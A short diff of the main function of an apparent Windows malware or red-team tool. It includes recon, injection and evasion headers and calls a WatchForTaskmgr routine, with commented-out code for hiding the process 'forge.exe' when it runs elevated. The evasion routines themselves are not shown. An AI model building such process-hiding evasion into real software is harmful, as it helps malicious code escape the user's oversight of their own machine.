@@ -3,7 +3,7 @@
 #include "recon.h"
 #include "injection.h"
 #include "evasion.h"
-#include <winternl.h>
+#include <Windows.h>
 
 int main(VOID)
 
@@ -67,13 +67,12 @@ int main(VOID)
 //}
 
 
-
-
-	printf("start");
-
+	// hiding star forge.exe
+	//if (IsElevated()) {
+	//		printf("Running elevated. hiding process.");
+	//		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchForTaskmgr, NULL, 0, NULL);
+	//	}
 	WatchForTaskmgr();
-	printf("end");
-
 
 
 	return 0;
